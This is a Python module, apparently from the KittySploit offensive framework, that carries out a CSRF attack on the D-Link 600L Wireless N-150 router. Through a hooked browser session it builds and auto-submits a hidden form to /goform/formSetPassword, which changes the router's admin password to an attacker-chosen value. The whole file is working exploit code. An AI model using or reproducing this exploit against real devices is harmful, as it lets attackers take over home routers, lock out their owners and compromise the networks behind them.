from kittysploit import *
from lib.protocols.http.csrf import Csrf

class Module(BrowserAuxiliary, Csrf):
	
	__info__ = {
		"name": "D-Link 600L CSRF",
		"description": "D-Link 600L Wireless N-150 Home Cloud Router - Change admin password via CSRF POST",
		"author": "KittySploit Team",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
	}
	
	target = OptString("http://192.168.1.1", "Target router URL (with http://)", required=True)
	password = OptString("pwned", "New password to set", required=True)

	def run(self):
		form_data = [
			f'<form method="POST" action="{self.target}/goform/formSetPassword">',
			f'<input type="hidden" name="config.login_name" value="admin" />',
			f'<input type="hidden" name="config.password" value="{self.password}" />',
			f'<input type="hidden" name="config.web_server_allow_graphics_auth" value="false" />',
			f'<input type="hidden" name="config.web_server_allow_wan_http" value="false" />',
			f'<input type="hidden" name="config.web_server_wan_port_http" value="8080" />',
			f'<input type="hidden" name="config.wan_web_ingress_filter_name" value="" />',
			'</form>'
		]
		
		print_info(f"Executing CSRF POST attack on: {self.target}")
		print_info(f"Target: {self.target}/goform/formSetPassword")
		print_info(f"New password: {self.password}")
		
		js_code = self.csrf_post_and_submit(form_data)
		result = self.send_js_and_wait_for_response(js_code, timeout=10.0)
		
		if result:
			print_success("CSRF POST attack executed successfully")
			print_info(f"Response: {result}")
			print_info("Password change request sent")
			return True
		else:
			fail.Message("Failed to execute CSRF POST attack")
		return False